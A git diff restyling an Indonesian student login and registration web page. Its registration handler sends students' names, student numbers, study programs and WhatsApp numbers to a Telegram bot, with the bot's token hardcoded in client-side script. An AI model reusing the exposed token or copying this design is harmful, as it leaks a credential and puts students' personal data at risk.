@@ -5,45 +5,39 @@
   <title>Login & Daftar Mahasiswa</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
   <style>
     * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
     html, body { margin: 0; padding: 0; height: 100%; overflow: auto; }
 
     body {
-      background: #000;
-      color: white;
       display: flex;
       justify-content: center;
       align-items: center;
+      color: white;
+      background: #000;
+      position: relative;
     }
 
-    video#bgvid {
+    .bg-image {
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
-      object-fit: cover;
+      background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRYrzNV7e4_EBJStkrIgGoTykU0JOsrD7hY49oj1UQWuyIAibZJEQlf3wE&s=10');
+      background-size: cover;
+      background-position: center;
       z-index: -2;
-      opacity: 0.3;
-      filter: brightness(0.5) contrast(1.3);
-    }
-
-    .overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      z-index: -1;
+      filter: brightness(0.4) blur(2px);
     }
 
     .container {
-      background: rgba(255, 255, 255, 0.1);
+      background: rgba(255, 255, 255, 0.07);
       backdrop-filter: blur(12px);
       padding: 2.5rem;
       border-radius: 20px;
-      width: 100%; max-width: 420px;
-      box-shadow:
-        inset 0 0 10px rgba(255, 255, 255, 0.1),
-        0 0 30px rgba(0, 255, 255, 0.2);
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
       animation: formFadeIn 1s ease;
     }
 
@@ -52,44 +46,38 @@
       100% { transform: translateY(0); opacity: 1; }
     }
 
-    h2#formTitle {
+    h2 {
       text-align: center;
-      font-size: 2rem;
       margin-bottom: 1.5rem;
-      color: #fff;
+      font-size: 2rem;
+      font-family: 'Orbitron', sans-serif;
+      color: #ffffff;
       text-shadow:
-        0 0 5px #fff,
+        0 0 5px #0ff,
         0 0 10px #0ff,
-        0 0 15px #0ff,
-        0 0 20px #0ff;
-      animation: glow 2s ease-in-out infinite alternate;
-    }
-
-    @keyframes glow {
-      from {
-        text-shadow:
-          0 0 5px #fff,
-          0 0 10px #0ff,
-          0 0 15px #0ff;
-      }
-      to {
-        text-shadow:
-          0 0 10px #fff,
-          0 0 20px #00f0ff,
-          0 0 30px #00f0ff,
-          0 0 40px #00f0ff;
-      }
+        0 0 20px #0ff,
+        0 0 40px #0ff;
     }
 
     input, select {
-      width: 100%; padding: 0.8rem; margin: 0.6rem 0;
-      border: none; border-radius: 12px;
+      width: 100%;
+      padding: 0.8rem;
+      margin: 0.6rem 0;
+      border: none;
+      border-radius: 12px;
       background: rgba(255, 255, 255, 0.15);
-      color: #1a1919; font-size: 1rem;
+      color: #1a1919;
+      font-size: 1rem;
       transition: 0.3s;
     }
 
+    input:hover, select:hover {
+      background: rgba(255, 255, 255, 0.3);
+      box-shadow: 0 0 8px #00f0ff;
+    }
+
     input::placeholder { color: #eee; }
+
     input:focus, select:focus {
       outline: none;
       background: rgba(255, 255, 255, 0.25);
@@ -99,56 +87,112 @@
     select {
       appearance: none;
       background-image: url("data:image/svg+xml;utf8,<svg fill='white' height='20' viewBox='0 0 24 24' width='20' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></svg>");
-      background-repeat: no-repeat; background-position: right 1rem center;
-      background-size: 1rem; padding-right: 2rem;
+      background-repeat: no-repeat;
+      background-position: right 1rem center;
+      background-size: 1rem;
+      padding-right: 2rem;
     }
 
     button {
-      width: 100%; padding: 0.9rem; margin-top: 1rem;
+      width: 100%;
+      padding: 0.9rem;
+      margin-top: 1rem;
       background: linear-gradient(to right, #8360c3, #2ebf91);
-      border: none; border-radius: 12px;
-      color: white; font-size: 1rem;
-      cursor: pointer; transition: 0.4s ease;
+      border: none;
+      border-radius: 12px;
+      color: white;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: 0.4s ease;
       box-shadow: 0 0 10px rgba(0,0,0,0.2);
     }
 
     button:hover {
       transform: translateY(-2px) scale(1.02);
-      box-shadow: 0 8px 20px rgba(0,255,255,0.5);
+      box-shadow: 0 8px 16px rgba(0,0,0,0.3);
+    }
+
+    button:active {
+      transform: scale(0.98);
       background: linear-gradient(to right, #2ebf91, #8360c3);
     }
 
     .switch {
-      text-align: center; margin-top: 1.2rem;
-      color: rgb(220, 220, 220);
-      cursor: pointer; transition: color 0.3s ease;
+      text-align: center;
+      margin-top: 1.2rem;
+      color: rgb(236, 236, 236);
+      cursor: pointer;
+      transition: color 0.3s ease;
     }
 
     .switch:hover {
-      color: #fff; text-decoration: underline;
+      color: #00f0ff;
+      text-decoration: underline;
     }
 
-    .loader { display: none; text-align: center; margin-top: 10px; }
-    .loader svg { animation: spin 1s linear infinite; }
-    @keyframes spin { from {transform: rotate(0deg);} to {transform: rotate(360deg);} }
+    .loader {
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      margin-top: 20px;
+    }
+
+    .loader .ring {
+      position: relative;
+      width: 60px;
+      height: 60px;
+      border: 4px solid transparent;
+      border-top: 4px solid #00f0ff;
+      border-radius: 50%;
+      animation: spinGlow 1s linear infinite;
+      box-shadow: 0 0 15px #00f0ff;
+    }
+
+    .loader .ring::after {
+      content: '';
+      position: absolute;
+      top: 8px;
+      left: 8px;
+      right: 8px;
+      bottom: 8px;
+      border: 2px solid rgba(0, 240, 255, 0.5);
+      border-radius: 50%;
+      box-shadow: inset 0 0 10px #00f0ff;
+    }
+
+    .loader p {
+      margin-top: 10px;
+      color: #00f0ff;
+      font-size: 14px;
+      text-shadow: 0 0 6px #00f0ff;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    @keyframes spinGlow {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
 
     #errorMsg {
-      display: none; color: yellow; text-align: center; margin-top: 10px;
+      display: none;
+      text-align: center;
+      margin-top: 10px;
       animation: fadeIn 0.4s ease-in-out;
     }
 
     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-    @media (max-width: 480px) { .container { padding: 1.5rem; margin: 1rem; } }
+
+    @media (max-width: 480px) {
+      .container { padding: 1.5rem; margin: 1rem; }
+    }
   </style>
 </head>
 <body onload="setToLogin()">
-  <video autoplay muted loop id="bgvid">
-    <source src="https://cdn.pixabay.com/video/2023/06/28/171060-838704830_large.mp4" type="video/mp4">
-  </video>
-  <div class="overlay"></div>
+  <div class="bg-image"></div>
 
   <div class="container">
-    <h2 id="formTitle">💻 Login Mahasiswa</h2>
+    <h2 id="formTitle">Login Mahasiswa</h2>
     <form id="form" autocomplete="off">
       <input type="text" id="npm" placeholder="Masukkan NPM" required />
       <input type="password" id="password" placeholder="Masukkan Password" required />
@@ -168,14 +212,12 @@
       <input type="text" id="nowa" placeholder="No WhatsApp (08xxxxx)" maxlength="13" style="display: none;" />
       <input type="text" id="captcha" placeholder="Ketik angka CAPTCHA" style="display: none;" />
       <button type="submit" id="submitBtn">Login</button>
+
       <div class="loader" id="loader">
-        <svg width="40" height="40" viewBox="0 0 100 100">
-          <circle cx="50" cy="50" r="32" stroke="#fff" stroke-width="8" fill="none" stroke-dasharray="200" stroke-dashoffset="0">
-            <animateTransform attributeName="transform" type="rotate" from="0 50 50" to="360 50 50" dur="1s" repeatCount="indefinite"/>
-          </circle>
-        </svg>
-        <p style="margin-top: 8px; color: #fff; font-size: 14px;">Memproses...</p>
+        <div class="ring"></div>
+        <p>Memproses data, mohon tunggu...</p>
       </div>
+
       <div id="errorMsg"></div>
     </form>
     <div class="switch" onclick="toggleForm()">Belum punya akun? Daftar</div>
@@ -206,13 +248,9 @@
     }
 
     function updateForm() {
-      document.getElementById("formTitle").innerHTML = isLogin
-        ? "💻 Login Mahasiswa"
-        : "📝 Daftar Mahasiswa";
+      document.getElementById("formTitle").innerText = isLogin ? "Login Mahasiswa" : "Daftar Mahasiswa";
       submitBtn.innerText = isLogin ? "Login" : "Daftar";
-      document.querySelector(".switch").innerText = isLogin
-        ? "Belum punya akun? Daftar"
-        : "Sudah punya akun? Login";
+      document.querySelector(".switch").innerText = isLogin ? "Belum punya akun? Daftar" : "Sudah punya akun? Login";
       document.getElementById("nama").style.display = isLogin ? "none" : "block";
       document.getElementById("prodi").style.display = isLogin ? "none" : "block";
       document.getElementById("nowa").style.display = isLogin ? "none" : "block";
@@ -222,7 +260,7 @@
 
     form.addEventListener("submit", function(e) {
       e.preventDefault();
-      loader.style.display = "block";
+      loader.style.display = "flex";
       errorMsg.style.display = "none";
       submitBtn.disabled = true;
 
@@ -240,7 +278,7 @@
         if (npm.length < 8 || nowa.length < 10 || nowa.length > 13) return showError("Format NPM/No WA salah.");
         if (captcha.value !== captcha.dataset.expected) return showError("CAPTCHA salah.");
 
-        const msg = `📝 Pendaftaran Baru\n\n👤 Nama: ${nama}\n🆔 NPM: ${npm}\n📚 Prodi: ${prodi}\n📱 WA: ${nowa}`;
+        const msg = `📥 Pendaftaran Baru\n\n👤 Nama: ${nama}\n🆔 NPM: ${npm}\n📚 Prodi: ${prodi}\n📱 WA: ${nowa}`;
         fetch(`https://api.telegram.org/bot7686312873:AAFgoSgH-5A8RyB8tJRzjevPlXI0iQMi8uI/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
